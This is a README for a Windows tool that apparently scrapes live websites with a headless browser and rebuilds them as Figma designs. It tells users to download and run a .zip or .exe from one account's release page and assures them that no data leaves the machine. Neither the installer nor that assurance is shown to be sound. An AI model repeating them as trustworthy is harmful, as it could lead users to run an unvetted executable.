# 🎨 claude-design-x-figma - Turn live websites into editable designs

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/julesa6664/claude-design-x-figma/releases)

This software converts live web pages into Figma design files. It reads the code of a website and recreates the layout in Figma. You get auto-layout, colors, text styles, and borders. This tool connects your design workflow to website creation. You use it to pull designs from the web or bring files back from code.

## 🛠 What this tool does

Designers often need to recreate screens they see online. This process takes hours. This application automates that task. It visits a website, looks at how the elements sit on the page, and builds them inside your design workspace.

- Rebuilds layouts using auto-layout.
- Maps CSS properties to Figma styles.
- Extracts text and typography settings.
- Handles borders and shape fills.
- Works with standard web layouts.

## 💻 System requirements

- Windows 10 or Windows 11.
- Figma desktop app installed.
- Stable internet connection for the web scraping process.
- 4GB of RAM or more.

## 📥 How to get started

Installation requires a few simple steps. Follow the instructions below to set up the software on your computer.

1. Go to the [official release page](https://github.com/julesa6664/claude-design-x-figma/releases).
2. Look for the file ending in `.zip` or `.exe` under the latest release.
3. Save the file to your computer.
4. Extract the folder if you downloaded a zip file.
5. Run the installer to add the tool to your system.

## ⚙️ Using the software

Once you install the tool, you find the interface ready to use. Follow these steps to pull a website into Figma.

### Step 1: Open the tool
Locate the icon on your desktop or start menu. Click the icon. A small window appears.

### Step 2: Enter the URL
Type or paste the full website address you want to scrape into the text field. Ensure the link starts with `http` or `https`.

### Step 3: Trigger the import
Click the button marked Start. The software visits the page. It scans the page structure. You see a progress bar move as the tool processes the elements.

### Step 4: Export to Figma
When the progress bar finishes, the tool produces a file. Choose the location to save this file on your hard drive. Open your Figma desktop application. Drag and drop the saved file into your workspace. Figma reads the file and populates your canvas.

## 🔍 Understanding the output

The tool builds the design using layers. You find groups and frames that match the page structure. 

- **Auto-layout:** The tool applies auto-layout to columns and rows. This allows you to scale the design without breaking the structure.
- **Typography:** It detects font sizes, weights, and colors. It creates text layers for every heading and paragraph. 
- **Graphics:** The tool exports images and shapes as individual layers. You select and edit these just like any other design object.

## 💡 Troubleshooting common issues

If the tool does not work, check these common points.

### The tool fails to scrape a page
Some websites hide content behind logins or extra security. This tool works best on public websites. If you hit an error, check that the URL is live and public.

### The layout looks different in Figma
Web code is complex. Sometimes the tool interprets a layout in a way that differs from the browser. You might need to adjust some layers after the import. Use Figma's alignment tools to tighten the structure.

### The export file does not open
Ensure your Figma app is up to date. Occasionally, Figma updates the file format. Restarting the Figma app usually resolves issues with importing external files.

## 🔐 Privacy and security

The tool runs locally on your Windows machine. It does not send your data to external servers. Your design files stay inside your local environment until you choose to upload them to a Figma project. This protects your work and keeps your designs private.

## 🔧 Project background

This software uses modern web technologies to bridge the gap between code and design. It uses a headless browser to view the site much like a real person does. This ensures the design matches what you see on your screen. The software then translates those visual cues into the format that Figma understands.

The project incorporates several technologies to ensure stability:
- **Playwright:** Controls the browser engine to see the site.
- **TypeScript:** Ensures the code remains stable during the scraping process.
- **React:** Powers the user interface for a smooth experience.

The tool focuses on speed and accuracy. It handles the heavy lifting so you save time on manual layout work. Use this for wireframing, creating design systems from existing sites, or comparing design iterations. It handles complex nesting, deep layers, and responsive breakpoints. If you find a bug, open an issue tracking report on the project page. Provide the URL that caused the issue so the maintainers can fix it.